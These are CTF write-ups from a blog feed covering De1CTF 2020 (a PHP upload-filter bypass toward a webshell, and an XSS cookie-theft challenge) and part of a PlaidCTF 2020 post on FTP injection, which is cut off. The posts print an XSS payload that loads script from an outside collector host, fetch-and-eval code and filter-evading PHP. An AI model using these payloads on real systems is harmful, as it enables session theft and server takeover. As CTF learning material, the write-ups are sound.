            <guid>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</guid>
            <description>&lt;p&gt;The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&amp;rsquo;m always surprised when I see it in action.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&rsquo;m always surprised when I see it in action.</p>
<p>De1CTF 2020 really gave me a thorough and in-depth understanding of php, maybe more than I would have ever done on my own. It was actually welcome experience to try out web problems that weren&rsquo;t just purely web-based.
Unfortunately, because of that these problems required more time for me to solve. Hard_Pentest_1 has been a journey in its web-based issues, but a whole different adventure in pwning when you actually complete part of it. So this blog post is gonna be a part 1 of 2.</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<h2 id="hard_pentest_1">Hard_Pentest_1</h2>
<p>The no-css basic HTML page exposes its php scripts right off the bat.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#75715e">//Clear the uploads directory every hour
</span><span style="color:#75715e"></span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
$sandbox <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uploads/&#34;</span><span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;De1CTF2020&#34;</span><span style="color:#f92672">.</span>$_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
<span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($sandbox);
<span style="color:#f92672">@</span><span style="color:#a6e22e">chdir</span>($sandbox);

<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;submit&#34;</span>]){
    <span style="color:#66d9ef">if</span> (($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2048</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">Check</span>()){
        <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;error&#34;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>){
            <span style="color:#66d9ef">die</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;error&#34;</span>]);
        }
        <span style="color:#66d9ef">else</span>{
            $filename<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>($_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>])<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">.</span>$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>];
            <span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], $filename);
            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;save in:&#34;</span> <span style="color:#f92672">.</span> $sandbox<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">.</span> $filename;
        }
    }
    <span style="color:#66d9ef">else</span>{
        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Not Allow!&#34;</span>;
    }
}

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Check</span>(){
    $BlackExts <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;php&#34;</span>);
    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;.&#34;</span>, $_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
    $exts <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">end</span>($ext));
    $file_content <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>]);

    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-z0-9;~^`&amp;|]/is&#39;</span>,$file_content)  <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($exts, $BlackExts) <span style="color:#f92672">&amp;&amp;</span> 
        <span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.\./&#39;</span>,$_FILES[<span style="color:#e6db74">&#34;file&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])) {
          <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
    }
    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
}
<span style="color:#75715e">?&gt;</span>

&lt;<span style="color:#f92672">html</span>&gt;
&lt;<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
&lt;<span style="color:#f92672">title</span>&gt;upload&lt;/<span style="color:#f92672">title</span>&gt;
&lt;/<span style="color:#f92672">head</span>&gt;
&lt;<span style="color:#f92672">body</span>&gt;

&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">enctype</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;multipart/form-data&#34;</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;file&#34;</span>&gt;&lt;<span style="color:#f92672">br</span>&gt;
    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;
&lt;/<span style="color:#f92672">form</span>&gt;

&lt;/<span style="color:#f92672">body</span>&gt;
&lt;/<span style="color:#f92672">html</span>&gt;
</code></pre></div><p>The <code>Check()</code> method is important here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
function Check(){
    $BlackExts = array(&#34;php&#34;);
    $ext = explode(&#34;.&#34;, $_FILES[&#34;file&#34;][&#34;name&#34;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&#34;file&#34;][&#34;tmp_name&#34;]);

    if(!preg_match(&#39;/[a-z0-9;~^`<span style="color:#960050;background-color:#1e0010">&amp;</span>|]/is&#39;,$file_content)  <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> 
        !in_array($exts, $BlackExts) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&#34;file&#34;][&#34;name&#34;])) {
          return true;
    }
    return false;


</code></pre></div><p>We can only upload php files, so maybe I can try to open a webshell here. The name, &ldquo;Hard_Pentest&rdquo; also gives me a hint that I should try to open a webshell. But the if statement blocks all alphanumerics and certain special characters from being processed. So, at first glance, anything we feed into this function won&rsquo;t be processed. But php is a <del>strange and weird</del> fascinating language with plenty of loopholes and different quirks about it, one of them, being the concept of &ldquo;<a href="https://www.php.net/manual/en/language.operators.increment.php">string/character arithmetic</a>&rdquo; (not the real term but I have no other informed way to describe it):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$a = &#39;Z&#39;
echo $a++; //Basically, Z + 1. This will print &#39;AA&#39;

output: &#39;AA&#39;
</code></pre></div><p>This is valid PHP. This definitely isn&rsquo;t something you&rsquo;d see in other conventional languages. What does it mean to increment &lsquo;Z&rsquo; by 1? Logically it makes no sense, but in PHP it does!</p>
<p>Another thing PHP has that we can utilize here is shorthand statements. Plenty of other languages have this feature as well in some way or another. For example, the ternary operator <code>?</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$result = $condition ? &#39;Jam&#39; : &#39;Vie&#39;;
</code></pre></div><p>is shorthand for</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if ($condition){
    $result = &#39;Jam&#39;;
}else{
    $result = &#39;Vie&#39;;
}
</code></pre></div><p>And finally, the last quirk about php: arrays and strings.</p>
<p>In other languages, arrays and strings are treated as distinct, two different data types. Some languages may treat strings as an array of chars, but by convention, just any random and arbitrary array can&rsquo;t and shouldn&rsquo;t be joined with a string without proper typesetting and checking. Okay, sounds fair and good and all. But what does php do instead?</p>
<p>In php, you can join arrays and strings together. The array will be converted to the string: <code>'Array'</code>.</p>
<pre><code>php &gt; echo ''.[];
PHP Notice: Array to string conversion on line 1
Array               &lt;------The string, 'Array'


php &gt; $var = ''.[];
php &gt; echo $var['!'=='@'];   &lt;------Should give us the first leter in 'Array'
A
</code></pre><p>What does this mean for us?</p>
<p>Because of the <code>Check()</code> function, we can&rsquo;t use alphanumerics or certain special characters. But for the list of valid special characters, <code>[]</code> square brackets are allowed, so we can declare arrays as normal. And we can still declare variables as usual, and the <code>+</code> operators are still valid so we can utilize string arithmetic.</p>
<p>So, all in all, if we wanted to spell the word <code>GET</code> with all the restrictions above, it would look like</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>[] <span style="color:#75715e">?&gt;</span>            //Declare array
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">?&gt;</span>         //array is converted to a string, &#34;Array&#34;
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>] <span style="color:#75715e">?&gt;</span>  //Access first element in array. The &#39;!&#39;==&#39;@&#39; check returns 0
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $___<span style="color:#f92672">=</span>$_ <span style="color:#75715e">?&gt;</span>          //&#39;A&#39;

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">=</span> $__ <span style="color:#75715e">?&gt;</span>   //&#39;G&#39;     

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>    //&#39;E&#39;
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__ <span style="color:#75715e">?&gt;</span>                           //&#39;GE&#39;

<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $__ <span style="color:#f92672">=</span> $_ <span style="color:#75715e">?&gt;</span>
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$____ <span style="color:#f92672">=</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#f92672">+</span> $__<span style="color:#f92672">++</span> <span style="color:#75715e">?&gt;</span>   //&#39;T&#39;
<span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span> $_______ <span style="color:#f92672">.=</span> $__  <span style="color:#75715e">?&gt;</span> //&#39;GET&#39;
</code></pre></div><p>Armed with this knowledge, we can write out entire lines of code of php that are just a series of various shorthand operators and symbols, and string arithmetic.</p>
<p>The first hurdle is the existence of the php opening tag. All php code requires the <code>&lt;?php</code> opening tag before anything, kinda like the start of any HTML document needing <code>&lt;HTML&gt;</code> to be declared first at the top.</p>
<p>Checking out php open tags, we come across the existence of shorthand tags for them, in the <a href="https://www.php.net/manual/en/language.basic-syntax.phptags.php">PHP documentation</a>:</p>
<blockquote>
<p>PHP includes a short echo tag &lt;?= which is a short-hand to the more verbose &lt;?php echo.</p>
<p>PHP also allows for short open tag &lt;? (which is discouraged since it is only available if enabled using the short_open_tag php.ini configuration file directive, or if PHP was configured with the &ndash;enable-short-tags option).</p>
</blockquote>
<p>So we can work around saying <code>&lt;?php&gt;</code> with <code>&lt;?=</code> instead!</p>
<p>The second hurdle is the semi-colon, which ends PHP statements. This can be worked around by simply creating new lines of PHP code for each time we want to make a new statement.</p>
<p>So with this in mind we can easily craft a php script to open up a webshell on their server, and poke around.
But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a shell on the server, but the scope of my pwn abilities isn&rsquo;t much to really comprehend what&rsquo;s going on here. Unfortunately, this challenge will remain unsolved until I can figure out how to play around with a Microsoft webshell.</p>
<hr>
<h2 id="animal-crossing">Animal Crossing</h2>
<p>Despite the few solves this problem has, I was drawn to it because of its name. Who doesn&rsquo;t love Animal Crossing?</p>

    <img src="/images/DE1CTF01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>The website allows you to make a passport. There are fields for your name, island name, nickname, and favourite fruit, I think.</p>
<p>When we make a passport we are redirected to a URL where the contents of what we typed are reflected in it (a sign of XSS attacks). And, at the bottom, is a report function (A BIG sign of XSS attacks).</p>
<p>When we go ahead and report it&hellip;</p>

    <img src="/images/DE1CTF02.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>I thought my client broke for a second. I wasn&rsquo;t expecting just plain code to be printed on the front-end.</p>
<p>It stumped me at first - the ability to report is blocked by this md5 code checking function. I needed to input some string whose md5 encoding&rsquo;s first 6 characters matched the randomized string. I didn&rsquo;t actually get what this was supposed to be doing, I was confused as to wether or not this was still a broken webpage or not, and I asked my team for help. Luckily, my teammate Filip, who&rsquo;s really good at pwn-based challenges, told me it was a &ldquo;proof of work&rdquo; - I just needed to brute-force my way in by finding a string with the md5 hash characters matching the random one. He gave me a script I could work with to start cracking it.</p>
<p>The good thing (in this context, bad for others) about md5 is that it&rsquo;s a one-way hashing but there is no salting to the code value, it&rsquo;s just the hash. Therefore, a string put through md5 would always return the same md5 encoding. So I just needed to randomly generate a string, md5 it, then check the digest against the random one.</p>
<p>Well great, I have succesfully done so and reported my passport to an admin. With this extra step of generating a valid code, the rest of Animal Crossing is a general XSS attack.</p>
<p>We want to report a URL that will grab the admin cookie when a user checks out our URL, and sends it to the server(You can use pastebin, XSSHunter, webhook.site, etc). Part of my payload looks like this:</p>
<pre><code>data=base64DATAXXXXXXX'javascript:eval('var a=document.createElement(\'script\');a.src=\'https://ServerHere.xss.ht\';document.body.appendChild(a)')
</code></pre><p>And we retrieve the cookie, which has the flag:</p>
<p><code>FLAG=De1CTF{I_l1k4_</code></p>
<p>But this is just one half of the flag. Where&rsquo;s the other half?</p>
<p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&quot;. After the CTF, I ruminated on the implications of this hint.</p>
<p>Looking at the document shows hundreds of png images, of what looks like other people&rsquo;s passports. I guess, the other half of the flag is among them. But the hint got me thinking - obviously, the admin would have to be leafing through the screenshots but its not like the flag will just magically turn up in one of the images cause they forgot to hide their flag text file out of view. So unless I can control the screenshot, I doubt I&rsquo;ll be able to find the flag.</p>
<p>The library &lsquo;<a href="https://html2canvas.hertzen.com/">html2canvas</a>&rsquo; comes to mind - taking screenshots with javascript. If I pass a payload to the admin that takes a screenshot of their interface, will the flag be there?</p>
<p>The idea here is to upload some code using html2canvas. If we give it a .png extension the server won&rsquo;t complain, after which you can fetch your image back, whatever you called it, and evaluate it so it takes the screenshot and you can download it. Your code should import the html2canvas library, take a screenshot, then upload that screenshot to the server for you to fetch and download.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/static/images/WhateverYouNamedYourFile.png`</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;eval((<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;0 + 0&#39;</span>));

<span style="color:#75715e">//0+0 check is my way of checking errors. If the fetch response evals to a 0 I did something wrong.
</span></code></pre></div><p>I create this and report it to the admin. When the admin visits the URL with the javascript payload (not shown here), it will take a screenshot of the admin&rsquo;s interface and send it back to me. I get the address and download it for the other half of the flag:</p>
<p><code>cool_GamE}</code></p>
<p>So the full flag would be: <code>FLAG=De1CTF{I_l1k4_cool_GamE}</code></p>
<p>This was definitely a challenge that stretched my capabilities of XSS attacks past grabbing cookies and pretending to be admin. The 2nd half of taking a screenshot of the admin&rsquo;s interface was unique and certainly not something I would&rsquo;ve thought of immediately. All in all, I&rsquo;m glad I participated in DE1CTF despite the difficulty levels of the problems I faced!</p>
<p>Jam</p>
<hr>
<h2 id="references">References</h2>
<p>Feature Image by Sara Kurfeß on Unsplash</p>]]></content>
        </item>
        
        <item>
            <title>Plaidctf 2020: Contrived Web Problem</title>
            <link>https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/</link>
            <pubDate>Tue, 28 Apr 2020 00:48:12 -0600</pubDate>
            
            <guid>https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/</guid>
            <description>&lt;p&gt;This was a CTF I unfortunately didn&amp;rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&amp;rsquo;m glad they did!&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!</p>
<p>This was a journey in understanding internet protocols that deepened my knowledge of them to completely new levels, so I&rsquo;m really grateful I got the chance to try this problem out - even though I tried it after the CTF ended :P</p>
<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
<p>This problem really holds up to its name. The website is simple - you have the option to login or register as a new user.</p>

    <img src="/images/CWP01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>Uniquely, we are given the source code for the problem. The source code shows us that the program has 6 services:</p>
<pre><code>\services
    \api 
    \email (email server, sends emails based on rabbitmq queue)
    \ftp
    \postgres (database)
    \rabbit (email queue, will send requests to the email server)
    \server
...
</code></pre><p>Checking out the code, I see that <code>flag.txt</code> is actually mentioned. It&rsquo;s in the services dockerfile, which is only used by <code>api</code>, <code>email</code> and <code>server</code> services. So, the vulnerability probably is within one of these services.</p>
<p>I checked out <code>api</code> first - and I see that the only protocols that it allows are HTTP, HTTPS, and FTP. Aside from the FTP protocol, the other 2 are pretty standard protocols to see in APIs.</p>
<p>Looking at <code>email</code> next, which uses <a href="https://nodemailer.com/about/">nodemailer</a>. I&rsquo;m not too familiar with it, so I check out its documentation:</p>

    <img src="/images/CWP02.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />


<p>This seems like a good loophole to exploit - we just need to specify the filepath and nodemailer will send an email with an attachment of whatever file we specified by the filepath, so we can exploit nodemailer&rsquo;s same origin policy. Since the rabbitmq server is the email server&rsquo;s queue, we will send a rogue email request into rabbitmq&rsquo;s queue to serve up to the email server, which will tell it to email us the flag!</p>
<p>Now the hard part - how <em>do we</em> ask the server? How do we send a request to the server to send us the email with the flag as an attachment?</p>
<p>I spent a long time trying to figure out how to send a rogue request to the rabbitmq server that will send us the email we want. I spent hours just browsing through the source code, not really paying attention&hellip;</p>
<p>Until I came across this piece of code in the <code>api/index.ts</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/image&#34;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad body&#34;</span>);
        }

        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">url</span>);

        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>;
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;http:&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;https:&#34;</span>) {
            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">toString</span>(), { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span> });
            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> (<span style="color:#a6e22e">imageReq</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">any</span>).<span style="color:#a6e22e">buffer</span>();
        } 
        
         <span style="color:#75715e">//THIS PART HERE!
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ftp:&#34;</span>) {
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">username</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">password</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">pathname</span>);
            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ftpClient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">connectFtp</span>({
                <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">hostname</span>,
                <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
                <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
                <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
            });
            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">ftpClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
        } <span style="color:#66d9ef">else</span> {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image url&#34;</span>);
        }
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPNG</span>(<span style="color:#a6e22e">image</span>)) {
            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image (not a png)&#34;</span>);
        }

        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;.png&#34;</span>).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">image</span>);
    })

    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#e6db74">&#34;4101&#34;</span>);

</code></pre></div><p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
It asks for the username, password and filename, <em>unchecked</em>, then asynchronously asks the server for the image that matches the filename that we specified.
FTP is a text-based protocol, and since username and password fields are passed to it unchecked, we could definitely inject some protocol commands, custom data (something like <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>), and make FTP send requests that were never intended to be sent.</p>
<p>Here&rsquo;s something I learned in my internet computing class about the FTP protocol: FTP connections have two modes : &ldquo;Active&rdquo; and &ldquo;Passive&rdquo;. I&rsquo;ll give a heavily truncated explanation of the two modes (if you&rsquo;re interested in learning more about the FTP protocol, check out the <a href="https://tools.ietf.org/html/rfc959">RFC specifications on it</a>):</p>
